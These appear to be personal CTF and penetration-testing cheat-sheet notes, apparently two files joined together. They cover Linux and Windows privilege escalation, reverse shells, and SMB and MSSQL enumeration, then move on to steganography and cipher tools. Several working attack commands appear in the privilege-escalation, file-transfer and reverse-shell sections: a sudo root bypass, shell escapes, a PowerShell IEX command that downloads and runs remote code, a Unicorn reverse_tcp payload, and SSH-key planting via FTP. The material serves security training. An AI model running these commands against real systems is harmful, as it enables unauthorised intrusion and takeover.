(enemy : enemy) NOPASSWD: ALL
```
We can try like below
```
> $ sudo -u enemy /bin/bash
id
uid=1001(enemy) gid=1001(enemy) groups=1001(enemy)
```

```
> $ sudo -l
[sudo] password for username: 
Matching Defaults entries for username on Victim:
  env_reset, mail_badpass,
  secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
 
  User username may run the following commands on Victim:
    (ALL : ALL) ALL
> $ cat /root/root.txt
cat: /root/root.txt: Permission denied  - Does not work
> $ sudo cat /root/root.txt  - Work
```

```
user@host:~$ sudo -l
sudo -l
Matching Defaults entries for user on host:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User user may run the following commands on host:
    (ALL, !root) /bin/bash

user@host:~$ sudo -u#-1 /bin/bash
sudo -u#-1 /bin/bash
Password: Password

Sorry, try again.
Password: <Enter Password>

root@host:/home/user# id
id
uid=0(root) gid=1001(user) groups=1001(user)

```


#### Gain More Privilige on windows system
- In meterpreter shell try `getsystem`
- In meterpreter shell try `background` and then follow rest of commands.
- search suggester
```
> use post/multi/recon/local_exploit_suggestor
show options
set session 1
run
```
- If worked fine, else Try follow rest of commands.
- Use this link: [FuzzySec Win Priv Exec](https://www.fuzzysecurity.com/tutorials/16.html)
- Use this method: [Sherlock](https://github.com/rasta-mouse/Sherlock)
- If current process doesnt own Privs, use `migrate <PID>` to get more Priviliges in Meterpretor.


To get Shell on Windows use [Unicorn](https://github.com/trustedsec/unicorn.git)
```
> $ /opt/unicorn/unicorn.py windows/meterpreter/reverse_tcp <HOST_IP> 3333 
[*] Generating the payload shellcode.. This could take a few seconds/minutes as we create the shellcode...
> $ msfconsole -r unicorn.rc 
[*] Started reverse TCP handler on <HOST_IP>:3333 
msf5 exploit(multi/handler) >         
```

#### MYSQL with Sudo Privilage

To get Shell from MYSQL
```
mysql> \! /bin/sh
```

#### VIM Editor with Sudo Privilage

To get Shell from VIM.

Method-1:
```
> $ sudo /usr/bin/vi /var/www/html/../../../root/root.txt
```
Method-2:

```
> $ sudo /usr/bin/vi /var/www/html/anyrandomFile
Type Escape and enter :!/bin/bash
```

#### Cronjob

If some system cron is getting some url present in the file, we can replace url to get flag as below.
```
> $ cat input 
url = "file:///root/root.txt"
```

To monitor cronjobs, we can tail the syslogs.
```
> $ tail -f /var/log/syslog
Nov 18 23:55:01 sun CRON[5327]: (root) CMD (python /home/sun/Documents/script.py > /home/sun/output.txt; cp /root/script.py /home/sun/Documents/script.py; chown sun:sun /home/sun/Documents/script.py; chattr -i /home/sun/Documents/script.py; touch -d "$(date -R -r /home/sun/Documents/user.txt)" /home/sun/Documents/script.py)
Nov 19 00:00:01 sun CRON[5626]: (root) CMD (python /home/sun/Documents/script.py > /home/sun/output.txt; cp /root/script.py /home/sun/Documents/script.py; chown sun:sun /home/sun/Documents/script.py; chattr -i /home/sun/Documents/script.py; touch -d "$(date -R -r /home/sun/Documents/user.txt)" /home/sun/Documents/script.py)
Nov 19 00:00:01 sun CRON[5627]: (sun) CMD (nodejs /home/sun/server.js >/dev/null 2>&1)
Nov 19 00:05:01 sun CRON[5701]: (root) CMD (python /home/sun/Documents/script.py > /home/sun/output.txt; cp /root/script.py /home/sun/Documents/script.py; chown sun:sun /home/sun/Documents/script.py; chattr -i /home/sun/Documents/script.py; touch -d "$(date -R -r /home/sun/Documents/user.txt)" /home/sun/Documents/script.py)
```


#### More or Less Command 

- If any file we found in low priv user and it contains something like this, we can execute it and minimize the size of terminal to enter the visual mode to gain root access.

```
> $ cat new.sh 
#!/bin/bash
/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service
```

```
> $ sh new.sh 
-- Logs begin at Sun 2019-11-17 19:19:25 EST, end at Mon 2019-11-18 17:13:44 EST. --
Nov 18 17:02:26 kali sudo[11538]: pam_unix(sudo:auth): authentication failure; logname= uid=33 eu
Nov 18 17:02:29 kali sudo[11538]: pam_unix(sudo:auth): conversation failed
Nov 18 17:02:29 kali sudo[11538]: pam_unix(sudo:auth): auth could not identify password for [www-
Nov 18 17:02:29 kali sudo[11538]: www-data : command not allowed ; TTY=unknown ; PWD=/tmp ; USER=
Nov 18 17:02:29 kali crontab[11595]: (www-data) LIST (www-data)
!/bin/bash
root # 
```

#### Improve Shell
To get the better Shell after taking control of the system.
```
www-data@machine:/var/www/html$ python3 -c "import pty;pty.spawn('/bin/bash')"
<html$ python3 -c "import pty;pty.spawn('/bin/bash')"                        
www-data@machine:/var/www/html$ ^Z
[1]+  Stopped                 nc -nlvp 443
root@kali:# stty raw -echo
----------------------Here we need to type `fg` and press Enter `Twice`
root@kali:# nc -nlvp 443 
www-data@machine:/var/www/html$ export TERM=xterm
```

#### Transfer Files from Host to Target Machine
- Use `python -m SimpleHTTPServer` in the host folder.
- Use Apache and put files in `/var/www/html/` folder.
- If Tomcat is Opened, upload the file/payload using the Admin panel.
- If wordpress is running, upload the file as plugin.
- In Windows Victim, use `certutil -urlcache -f http://<HOST_IP>/<FILE_NAME> <OUTPUT_FILE_NAME>`
- In Windows, Using Powershell: `PS C:\Users\User\Desktop> IEX(New-Object Net.WebClient).downloadString('http://<HOST_IP>:8000/jaws-enum.ps1')`


#### FTP

If we were able to access FTP, we can upload SSH Key to login without password.
```
 > $ ftp <HOST_IP>
Connected to <HOST_IP>.
220 ProFTPD 1.3.5a Server (Debian) [::ffff:<HOST_IP>]
Name (<HOST_IP>:root): notch
331 Password required for notch
Password:
230 User notch logged in
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> put id_rsa.pub
ftp> rename id_rsa.pub authorized_keys
```

### Reconnoitre
Security tool for multithreaded information gathering and service enumeration whilst building directory structures to store results, along with writing out recommendations for further testing.
- [Link](https://github.com/codingo/Reconnoitre)
```
> $ reconnoitre -t 10.10.10.37 -o `pwd` --services`
```

ba≈üka bir g√ºn
-------------

# Table of Contents

1. [Post-Exploitation](#post-exploitation)
2. [Port Enumeration](#port-enumeration)
3. [445 (smb/Samba)](#445-smbsamba)
4. [1433 (Microsoft SQL Server)](#1433-microsoft-sql-server)
5. [SNMP](#snmp)
6. [Microsoft Office Macros](#microsoft-office-macros)
7. [Retrieving Network Service Hashes](#retrieving-network-service-hashes)
8. [Windows Reverse Shells](#windows-reverse-shells)
9. [Known Exploits](#known-exploits)
10. [Excess](#excess)
11. [Esoteric Languages](#esoteric-languages)
13. [Steganography](#steganography)
14. [Cryptography](#cryptography)
15. [Networking](#networking)
16. [PHP](#php)
17. [PDF Files](#pdf-files)
18. [Forensics](#forensics)
19. [PNG File Forensics](#png-file-forensics)
20. [APK Forensics](#apk-forensics)
21. [Web](#web)
22. [Reverse Engineering](#reverse-engineering)
23. [PowerShell](#powerShell)
24. [Windows Executables](#windows-executables)
25. [Python Reversing](#python-reversing)
26. [Binary Exploitation/pwn](#binary-exploitationpwn)
27. [VisualBasicScript Reversing](#visualbasicscript-reversing)
28. [Miscellaneous](#miscellaneous)
29. [Jail Breaks](#jail-breaks)
30. [Trivia](#trivia)

---------------

Post-Exploitation
====================

* [static-binaries]

	If you need to use a program that is not on the box you just broke into, try and build a static binary! I've seen this used on Fatty for HackTheBox, getting a `pty` with the typical `python -c 'import pty...'` trick when it didn't have Python originally!

	https://github.com/andrew-d/static-binaries

Port Enumeration
====================


445 (smb/Samba)
-----------------------

* [`smbmap`](https://github.com/ShawnDEvans/smbmap)

	`smbmap` tells you permissions and access, which `smbclient` does _not_ do!

	To try and list shares as the anonymous user **DO THIS** (this doesn't always work for some weird reason)

```
smbmap -H 10.10.10.125 -u anonymous
```

Or you can attempt just:

```
smbmap -H 10.10.10.125
```

And you can specify a domain like so:

```
smbmap -H 10.10.10.125 -u anonymous -d HTB.LOCAL
```

Worth trying `localhost` as a domain, if that gets "NO_LOGON_SERVERS"

```
smbmap -H 10.10.10.125 -u anonymous -d localhost
```

* `enum4linux`


```
enum4linux 10.10.10.125
```

* `smbclient`

	**NOTE: DEPENDING ON THE VERSION OF SMBCLIENT YOU ARE USING, you may need to SPECIFY the use of S<B version 1 or SMB version 2. You can dp this with `-m SMB2`. Older versions of SMBclient (latest being 4.10 at the time of writing) use SMB1 _by default_.**

	You can use `smbclient` to look through files shared with SMB. To _list_ available shares:

```
smbclient -m SMB2 -N -L //10.10.10.125/
```

Once you find a share you want to/can access, you can connect to shares by using the name following the locator:

```
smbclient -m SMB2 -N //10.10.10.125/Reports
```

You will see a `smb: \>` prompt, and you can use `ls` and `get` to retrieve files or even `put` if you need to place files there.

1433 (Microsoft SQL Server)
------------------------------

* `impacket` -> `mssqlclient.py`

	You can connect to a Microsoft SQL Server with `myssqlclient.py` knowing a username and password like so:

```
mssqlclient.py username@10.10.10.125
```

It will prompt you for a password. **If your password fails, the server might be using "Windows authentication", which you can use with:**

```
mssqlclient.py username@10.10.10.125 -windows-auth
```

If you have access to a Micosoft SQL Server, you can try and `enable_xp_cmdshell` to run commands. With `mssqlclient.py` you can try:

```
SQL> enable_xp_cmdshell
```

though, you may not have permission. If that DOES succeed, you can now run commands like:

```
SQL> xp_cmdshell whoami
```

SNMP
----------------

* snmp-check

```
snmp-check 10.10.10.125
```


Microsoft Office Macros
---------------

* [`oletools`](https://github.com/decalage2/oletools) -> `olevba`

	`olevba` can look for Macros within office documents (which you should always check) with just supplying the filename:

```
olevba "Currency Volume Report.xlsm"
```

Retrieving Network Service Hashes
----------------------------------


* [`Responder.py`](https://github.com/SpiderLabs/Responder)


```
./Responder.py -I tun0
```


Windows Reverse Shells
---------------------------


* [Nishang][nishang]

	If you have access to PowerShell,  you can get a Reverse shell by using [nishang]'s `Invoke-PowerShellTcp.ps1` script inside of the `Shells` directory. Be sure to add the function call example to the bottom of your script, so all you need to to do to host it is (on your Attacker machine):

```
python -m SimpleHTTPServer
```

and then on the victim machine:

```
powershell IEX( New-Object Net.WebClient).DownloadString("http://10.10.14.6:8000/reverse.ps1") )
```

Also, if you want to have nice up and down arrow key usage within your Windows reverse shell, you can use the utility `rlwrap` before your netcat listener command.

```
rlwrap nc -lnvp 9001
```


Known Exploits
------------------

* Java RMI

	Metasploit module: `exploit/multi/misc/java_rmi_server`

	When testing this, responses are _known to come back with an error or exception_. Your code MAY VERY WELL still be executing. Try and run commands that include a callback. And _use Python_ to live off the land and try avoid special characters, like `|` pipes! [ysoserial](https://github.com/frohoff/ysoserial) is a good tool for deserializing Java code to take advantage of this vulnerability.

* Heartbleed

	Metasploit module: `auxiliary/scanner/ssl/openssl_heartbleed`

	Be sure to use `set VERBOSE true` to see the retrieved results. This can often contain a flag or some valuable information.

* libssh - SSH

	`libssh0.8.1` (or others??) is vulnerable to an easy and immediate login. Metasploit module: `auxiliary/scanner/ssh/libssh_auth_bypass`. Be sure to `set spawn_pty true` to actually receive a shell! Then `sessions -i 1` to interact with the shell spawned (or whatever appropriate ID)

* Bruteforcing RDP

	Bruteforcing RDP with `hydra` or `ncrack` is __NOT ALWAYS ADVISABLE__ because of Cred-SSB. An option _might_ be to script xrdp to automate against a password or word list... __but THIS IS NOT TESTED__.

* Apache Tomcat

	If you can determine that you are working with an Apache Tomcat server (usually by visiting pages that do not exist and seeing a 404 error message), try to visit `/Manager`, which is usually accessible on Tomcat. Possible credentials could be `tomcat:tomcat`, `tomcat:s3cr3t`, `admin:s3cr3t`, `root:s3cr3t`, etc. etc.. Worthy of bruteforcing with `hydra`.

	If you see URLs are appended with a `.action` (not a `.do`), you may be working with Apache Struts.

* Apache Struts

	To identify the Apache Struts version is running,

Excess
--------

* [wifite2](https://github.com/derv82/wifite2)

	Brute-force a Wi-Fi access point.

* [impacket](https://github.com/SecureAuthCorp/impacket)

	Tool to quickly spin up a Samba share.

* [enum4linux](https://github.com/portcullislabs/enum4linux)

	Script to scan Windows Samba shares. VERY GOOD TO RUN FOR WINDOWS ENUMERATION.

* [drupalgeddon2](https://github.com/dreadlocked/Drupalgeddon2)

	Attack script for old or outdated Drupal servers. Usually very effective.

Esoteric Languages
-----------------------


* [Try It Online](https://tio.run/)

	An online tool that has a ton of Esoteric language interpreters.

* [Brainfuck](https://esolangs.org/wiki/brainfuck)

	This language is easily detectable by its huge use of plus signs, braces, and arrows. 	There are plenty of online interpreters, like this one: [https://copy.sh/brainfuck/](https://copy.sh/brainfuck/) Some example code:

```
++++++++++[>+>+++>+++++++>++++++++++<<<<-]>>>>+++++++++++++++++.--.--------------.+++++++++++++.----.-----------
--.++++++++++++.--------.<------------.<++.>>----.+.<+++++++++++.+++++++++++++.>+++++++++++++++++.-------------
--.++++.+++++++++++++++.<<.>>-------.<+++++++++++++++.>+++..++++.--------.+++.<+++.<++++++++++++++++++++++++++
.<++++++++++++++++++++++.>++++++++++++++..>+.----.>------.+++++++.--------.<+++.>++++++++++++..-------.++.
```

* [COW](https://esolangs.org/wiki/COW)

	This language is easily identified by numerous "MOO" statements and random capitalization. It has an option on [https://tio.run/](https://tio.run/) Some example code:

```
 MoO moO MoO mOo MOO OOM MMM moO moO
 MMM mOo mOo moO MMM mOo MMM moO moO
 MOO MOo mOo MoO moO moo mOo mOo moo
 ```

* [Malboge](https://esolangs.org/wiki/malbolge)

	An esoteric language that looks a lot like Base85... but isn't. Often has references to "Inferno" or "Hell" or "Dante." Online interpreters like so: [http://www.malbolge.doleczek.pl/](http://www.malbolge.doleczek.pl/) Some example code:

```
(=<`#9]~6ZY32Vx/4Rs+0No-&Jk)"Fh}|Bcy?`=*z]Kw%oG4UUS0/@-ejc(:'8dc
```

* [Piet](https://esolangs.org/wiki/piet)

	A graphical programming language... looks like large 8-bit pixels in a variety of colors. Can be interpreted with the tool [`npiet`][npiet]

![https://www.bertnase.de/npiet/hi.png](https://www.bertnase.de/npiet/hi.png)

* [Ook!](http://esolangs.org/wiki/ook!)

	A joke language. Recognizable by `.` and `?`, and `!`. Online interpreter for this language: [https://www.dcode.fr/ook-language](https://www.dcode.fr/ook-language) Some example code:

```
Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.
Ook. Ook. Ook. Ook. Ook! Ook? Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.
Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook! Ook! Ook? Ook! Ook? Ook.
Ook! Ook. Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.
Ook. Ook. Ook! Ook? Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook?
Ook! Ook! Ook? Ook! Ook? Ook. Ook. Ook. Ook! Ook. Ook. Ook. Ook. Ook. Ook. Ook.
```

* [Rockstar](https://esolangs.org/wiki/Rockstar)

	A language intended to look like song lyrics [github link](https://github.com/RockstarLang/rockstar).
	Rockstar has an official online interpreter which you can find here: [https://codewithrockstar.com/online](https://codewithrockstar.com/online)

	below is fizzbuzz in Rockstar:
```
Midnight takes your heart and your soul
While your heart is as high as your soul
Put your heart without your soul into your heart

Give back your heart


Desire is a lovestruck ladykiller
My world is nothing
Fire is ice
Hate is water
Until my world is Desire,
Build my world up
If Midnight taking my world, Fire is nothing and Midnight taking my world, Hate is nothing
Shout "FizzBuzz!"
Take it to the top

If Midnight taking my world, Fire is nothing
Shout "Fizz!"
Take it to the top

If Midnight taking my world, Hate is nothing
Say "Buzz!"
Take it to the top

Whisper my world
```

Steganography
---------------------

* [StegCracker][StegCracker]

	Don't ever forget about [`steghide`][steghide]! This tool can use a password list like `rockyou.txt` with steghide. SOME IMAGES CAN HAVE MULTIPLE FILED ENCODED WITH MULTIPLE PASSWORDS.

* [Steganography Online](http://stylesuxx.github.io/steganography/)

	A tool often used in CTFs for encoding messages into images.

* [StegSeek][StegSeek]

	This is similar to `stegcracker`, but _much_ faster. Can also extract metadata without a password list.

* [`steg_brute.py`](https://github.com/Va5c0/Steghide-Brute-Force-Tool)

	This is similar to `stegcracker` above.

* [`openstego`][OpenStego]

	A [Java][Java] [`.JAR`][JAR] tool, that can extract data from an image. A good tool to use on guessing challenges, when you don't have any other leads. We found this tool after the [Misc50](http://0xahmed.ninja/nullcon-hackim18-ctf-writeups/) challenge from [HackIM 2018](https://ctftime.org/event/566)

* [`Stegsolve.jar`][Stegsolve.jar]

	A [Java][Java] [`.JAR`][JAR] tool, that will open an image and let you as the user arrow through different renditions of the image (viewing color channels, inverted colors, and more). The tool is surprisingly useful.

* [`steghide`][steghide]

	A command-line tool typically used alongside a password or key, that could be uncovered some other way when solving a challenge.

* [`stepic`](http://domnit.org/stepic/doc/)

	Python image steganography. Stepic hides arbitrary data inside PIL images. Download it here: http://domnit.org/stepic/doc/

* [Digital Invisible Ink Stego Tool](http://diit.sourceforge.net/)

	A Java steganography tool that can hide any sort of file inside a digital image (regarding that the message will fit, and the image is 24 bit colour)

# WHEN GIVEN A FILE TO WORK WITH, DO NOT FORGET TO RUN THIS STEGHIDE WITH AN EMPTY PASSWORD!

* [ImageHide](https://www.softpedia.com/get/Security/Encrypting/ImageHide.shtml)

	For PNG images (or BMP) images, there exists a Windows utility that can hide "ENCRYPTED" text within the LSB. If you also happen to have passwords, you can decrypt this and potentially find a flag. [https://www.softpedia.com/get/Security/Encrypting/ImageHide.shtml](https://www.softpedia.com/get/Security/Encrypting/ImageHide.shtml)

* [stegoVeritas](https://github.com/bannsec/stegoVeritas/)

	Another steganography tool. A simple command-line tool and super easy to use -- definitely one to at least try.

* Unicode Steganography / Zero-Width Space Characters

	Some text that may be trying to hide something, in a seemingly innocent way, like "Hmm, there may be something hiding here..." may include zero-width characters. This is a utility that might help: [https://330k.github.io/misc_tools/unicode_steganography.html](https://330k.github.io/misc_tools/unicode_steganography.html) ... Other options are just gross find and replace operations in Python IDLE.

* Online LSB Tools

	There are many online LSB tools that work in different ways. If you are given a file that you know is part of a Least Significant Bit challenge, try these tools:

	[https://manytools.org/hacker-tools/steganography-encode-text-into-image/](https://manytools.org/hacker-tools/steganography-encode-text-into-image/) Only supports PNG
	[https://stylesuxx.github.io/steganography/](https://stylesuxx.github.io/steganography/)

* Other stego tools:

	[https://github.com/DominicBreuker/stego-toolkit](https://github.com/DominicBreuker/stego-toolkit)

* [`zsteg`][zsteg]

	Command-line tool for use against Least Significant Bit steganography... unfortunately only works against PNG and BMP images.

* [`jsteg`][jsteg]

    Another command-line tool to use against JPEG images. [https://github.com/lukechampine/jsteg](https://github.com/lukechampine/jsteg) Handy for Hackerrank Codefest CTF 2018.

* [Jstego][Jstego]

    A GUI tool for JPG steganography. [https://sourceforge.net/projects/jstego/](https://sourceforge.net/projects/jstego/) It is a [Java][Java] [JAR] file similar to stegsolve.jar

* Morse Code

	Always test for this if you are seeing two distinct values... _it may not always be binary!_ Online decoders like so: [https://morsecode.scphillips.com/translator.html](https://morsecode.scphillips.com/translator.html). If you need to be case-sensistive or include a bit more stuff like numbers and punctuation, use this code: [https://gist.github.com/JohnHammond/961acabfd85a8715220fa79492b25368](https://gist.github.com/JohnHammond/961acabfd85a8715220fa79492b25368)

	If you find Morsecode in the "international written form", like "dah-dit-dit-dah" etcetera, you can use this code: [https://gist.github.com/JohnHammond/7d3ddb167fa56f139dc4419091237b51](https://gist.github.com/JohnHammond/7d3ddb167fa56f139dc4419091237b51) ... which was carved out of this resource: [https://morsecode.scphillips.com/morse.html](https://morsecode.scphillips.com/morse.html)

* Whitespace

	Tabs and spaces could be representing 1's and 0's and treating them as a binary message... or, they could be whitespace done with [`snow`][snow] or an esoteric programming language interpreter: [https://tio.run/#whitespace](https://tio.run/#whitespace)

* Audio Speed Change (also change pitch)

```
mplayer -af scaletempo -speed 64 flag.mp3
```

* DNA Codes

    When given a sequence with only A, C, G, T , there is an online mapping for these. Try this:

    ![img/dna_codes.png](img/dna_codes.png)
    ![img/genome_coding.jpg](img/genome-coding.jpg)


* Extract Thumbnail (data is covered in original image)

	If you have an image where the data you need is covered, try viewing the thumbnail:

```
exiftool -b -ThumbnailImage my_image.jpg > my_thumbnail.jpg
```

* [`snow`][snow]

	A command-line tool for whitespace steganography (see above).

* SONIC Visualizer (audio spectrum)

	Some classic challenges use an audio file to hide a flag or other sensitive stuff. SONIC visualizer easily shows you [spectrogram](https://en.wikipedia.org/wiki/Spectrogram). __If it sounds like there is random bleeps and bloops in the sound, try this tactic!__

* [XIAO Steganography](https://xiao-steganography.en.softonic.com/)

	Being a Windows-specific tool, it is often used in CTFs to hide flags inside audio files. __Take a look if the challenge has some odd strings which might resemble passwords.__


* [Detect DTMF Tones]

	Audio frequencies common to a phone button, DTMF: [https://en.wikipedia.org/wiki/Dual-tone_multi-frequency_signaling](https://en.wikipedia.org/wiki/Dual-tone_multi-frequency_signaling).

* Phone-Keypad

	Some messages may be hidden with a string of numbers, but really be encoded with old cell-phone keypads, like text messaging with numbers repeated:

![https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQSySxHjMFv80XWp74LZpfrnAro6a1MLqeF1F3zpguA5PGSW9ov](https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQSySxHjMFv80XWp74LZpfrnAro6a1MLqeF1F3zpguA5PGSW9ov)

* [`hipshot`][hipshot]

	A [Python] module to compress a video into a single standalone image, simulating a long-exposure photograph. Was used to steal a [QR code] visible in a video, displayed through "Star Wars" style text motion.

* [QR code]

	A small square "barcode" image that holds data.

* [`zbarimg`][zbarimg]

	A command-line tool to quickly scan multiple forms of barcodes, [QR codes] included. Installed like so on a typical [Ubuntu] image:

```
sudo apt install zbar-tools
```

* Punctuation marks `!`, `.` and `?`

	I have seen some challenges use just the end of `.` or `?` or `!` to represent the [Ook](http://esolangs.org/wiki/ook!) esoteric programming language. Don't forget that is a thing!

Cryptography
-----------------

* Cryptii

	[https://cryptii.com](https://cryptii.com) has multiple decoding tools like base64, Ceaser Cipher, ROT13, Vigen√®re Cipher and more.
* Keyboard Shift

	[https://www.dcode.fr/keyboard-shift-cipher](https://www.dcode.fr/keyboard-shift-cipher) If you see any thing that has the shape of a sentence but it looks like nonsense letters, and notes some shift left or right, it may be a keyboard shift...

* Bit Shift

	Sometimes the letters may be shifted by a stated hint, like a binary bit shift ( x >> 1 ) or ( x << 1 ).

* Reversed Text

	Sometimes a "ciphertext" is just as easy as reversed text. Don't forgot to check under this rock! You can reverse a string in [Python] like so:

```
"UOYMORFEDIHOTGNIYRTEBTHGIMFTCA.TAHTTERCESASISIHT"[::-1]
```

* XOR

	ANY text could be XOR'd. Techniques for this are Trey's code, and XORing the data against the known flag format. Typically it is given in just hex, but once it is decoded into raw binary data, it gives it keeps it's hex form (as in `\xde\xad\xbe\xef` etc..) Note that you can do easy XOR locally with Python like so (you need `pwntools` installed):

	``` python
	python >>> import pwn; pwn.xor("KEY", "RAW_BINARY_CIPHER")
	```

# IF YOU KNOW A DECENT CRIB (PLAINTEXT), USE CYBERCHEF TO HELP DETERMINE THE KEY

# DO NOT FORGET TO JUST BRUTEFORCE JUST THE FIRST BYTE, OR TWO BYTES OR THREE BYTES.


* Caesar Cipher

	The most classic shift cipher. Tons of online tools like this: [https://www.dcode.fr/caesar-cipher](https://www.dcode.fr/caesar-cipher) or use `caesar` as a command-line tool (`sudo apt install bsdgames`) and you can supply a key for it. Here's a one liner to try all letter positions:

	```
	cipher='jeoi{geiwev_gmtliv_ws_svmkmrep}' ; for i in {0..25}; do echo $cipher | caesar $i; done
	```

	__Be aware!__ Some challenges include punctuation in their shift! If this is the case, try to a shift within all 255 ASCII characters, not just 26 alphabetical letters!

* `caesar`

	A command-line caesar cipher tool (noted above) found in the `bsdgames` package.

* [Atbash Cipher]

	If you have some text that you have no idea what it is, try the [Atbash cipher]! It's a letter mapping, but the alphabet is reversed: like `A` maps to `Z`, `B` maps to `Y` and so on. There are tons of online tools to do this ([http://rumkin.com/tools/cipher/atbash.php](http://rumkin.com/tools/cipher/atbash.php)), and you can build it with [Python].

* [Vigenere Cipher]

	[http://www.mygeocachingprofile.com/codebreaker.vigenerecipher.aspx](http://www.mygeocachingprofile.com/codebreaker.vigenerecipher.aspx), [https://www.guballa.de/vigenere-solver](https://www.guballa.de/vigenere-solver) and personal Python code here: [https://pastebin.com/2Vr29g6J](https://pastebin.com/2Vr29g6J)


* Gronsfeld Cipher

	A variant of the Vignere cipher that uses numbers insteads of letters. [http://rumkin.com/tools/cipher/gronsfeld.php](http://rumkin.com/tools/cipher/gronsfeld.php)

* Beaufourt Cipher

	[https://www.dcode.fr/beaufort-cipher](https://www.dcode.fr/beaufort-cipher)

* [Bacon Cipher](https://en.wikipedia.org/wiki/Bacon%27s_cipher)

	A substitution cipher that replaces each character with five characters from a set of two (A and B is used most of the time). If we look at A as 0 and B as 1 it is a special encoding to binary numbers, where the character A has the value of binary `b00000`. Easy to recognize, because the ciphertext only contains two characters (e.g.: A and B) and the length of the ciphertext is divisible by 5. Example: `AAABB AAABA ABBAB AAABB AABAA AAAAB AAAAA AAABA ABBAB ABBAA`.

        [Online tool](http://rumkin.com/tools/cipher/baconian.php)

* Python random module cracker/predictor

	[https://github.com/tna0y/Python-random-module-cracker](https://github.com/tna0y/Python-random-module-cracker)... helps attack the Mersenne Twister used in Python's random module.

* Transposition Cipher

* RSA: Classic RSA

	Variables typically given: `n`, `c`, `e`. _ALWAYS_ try and give to [http://factordb.com](http://factordb.com). If `p` and `q` are able to be determined, use some RSA decryptor; handmade code available here: [https://pastebin.com/ERAMhJ1v](https://pastebin.com/ERAMhJ1v)

* RSA: Multi-prime RSA

	When you see multi-prime RSA, you can use calculate `phi` by still using all the factors.

```
phi = (a - 1) * (b - 1) * (c - 1)    # ... etcetera
```

__If FactorDB cannot find factors, try alpertron: [https://www.alpertron.com.ar/ECM.HTM](https://www.alpertron.com.ar/ECM.HTM)__


* RSA: `e` is 3 (or small)

	If `e` is 3, you can try the cubed-root attack. If you the cubed root of `c`, and if that is smaller than the cubed root of `n`, then your plaintext message `m` is just the cubed root of `c`! Here is [Python] code to take the cubed root:

```
def root3rd(x):
    y, y1 = None, 2
    while y!=y1:
        y = y1
        y3 = y**3
        d = (2*y3+x)
        y1 = (y*(y3+2*x)+d//2)//d
    return y
```

* RSA: Wiener's Little D Attack

	The telltale sign for this kind of challenge is an enormously large `e` value. Typically `e` is either 65537 (0x10001) or `3` (like for a Chinese Remainder Theorem challenge). Some stolen code available here: [https://pastebin.com/VKjYsDqD](https://pastebin.com/VKjYsDqD)

* RSA:  Boneh-Durfee Attack
	The tellgate sign for this kind of challenge is also an enormously large `e` value (`e` and `n` have similar size).
Some code for this attack can be found [here](https://github.com/mimoo/RSA-and-LLL-attacks/blob/master/boneh_durfee.sage)

* RSA: Chinese Remainder Attack

	These challenges can be spotted when given  mutiple `c` cipher texts and multiple `n` moduli. `e` must be the same number of given `c` and `n` pairs. Some handmade code here: [https://pastebin.com/qypwc6wH](https://pastebin.com/qypwc6wH)

* [LC4]

	This is an adaptation of RC4... just not. There is an implementation available in Python.
	[https://github.com/dstein64/LC4/blob/master/documentation.md](https://github.com/dstein64/LC4/blob/master/documentation.md)

* Elgamal

* Affine Cipher

* Substitution Cipher (use quip quip!)

	[https://quipqiup.com/](https://quipqiup.com/)

* Railfence Cipher

	[http://rumkin.com/tools/cipher/railfence.php](http://rumkin.com/tools/cipher/railfence.php)


* [Playfair Cipher]

	racker: [http://bionsgadgets.appspot.com/ww_forms/playfair_ph_web_worker3.html](http://bionsgadgets.appspot.com/ww_forms/playfair_ph_web_worker3.html)

* Polybius Square

	[https://www.braingle.com/brainteasers/codes/polybius.php](https://www.braingle.com/brainteasers/codes/polybius.php)

* The Engima

	[http://enigma.louisedade.co.uk/enigma.html](http://enigma.louisedade.co.uk/enigma.html),
	[https://www.dcode.fr/enigma-machine-cipher](https://www.dcode.fr/enigma-machine-cipher)

* AES ECB

	The "blind SQL" of cryptography... leak the flag out by testing for characters just one byte away from the block length.


* Two-Time Pad

* [International Code of Signals Maritime]

	First drafted by the British Board of Trade in 1855 and adopted as a world-wide standard on 1 January 1901. It is used for communications with ships, but also occasionally used by geocaching mystery caches (puzzle caches), CTFs and various logic puzzles. You may want to give a look at the tool [maritime flags translator].

![https://www.marvindisplay.com/images/SignalFlags.gif](https://www.marvindisplay.com/images/SignalFlags.gif)


* Daggers Cipher

The daggers cipher is another silly text-to-image encoder. This is the key, and you can
find a decoder on [https://www.dcode.fr/daggers-alphabet](https://www.dcode.fr/daggers-alphabet).

![img/dagger_cipher.png](img/dagger_cipher.png)

* Hylian Language (Twilight Princess)

The Hylian language is another silly text-to-image encoder. This is the key, and you can
find a decoder on [https://www.dcode.fr/hylian-language-twilight-princess](https://www.dcode.fr/hylian-language-twilight-princess).

![img/hylian.png](img/hylian.png)

* Hylian Language (Breath of the Wild)

The Hylian language is another silly text-to-image encoder. This is the key, and you can
find a decoder on [https://www.dcode.fr/hylian-language-breath-of-the-wild](https://www.dcode.fr/hylian-language-breath-of-the-wild).

![img/botw.jpg](img/botw.jpg)

* Sheikah Language (Breathe of the Wild)

The Sheikah language is another silly text-to-image encoder. This is the key, and you can
find a decoder on [https://www.dcode.fr/sheikah-language](https://www.dcode.fr/sheikah-language).

![img/sheikah.png](img/sheikah.png)

* Hexahue Alphabet 

The hexhue is an another tex-to-image enocder. you can find a decoder
on [https://www.boxentriq.com/code-breaking/hexahue](https://www.boxentriq.com/code-breaking/hexahue)

![img](img/hexahue-alphabet.png)


Networking
---------------

* [Wireshark]

	The go-to tool for examining [`.pcap`][PCAP] files.

* [Network Miner]

	Seriously cool tool that will try and scrape out images, files, credentials and other goods from [PCAP] and [PCAPNG] files.

* [PCAPNG]

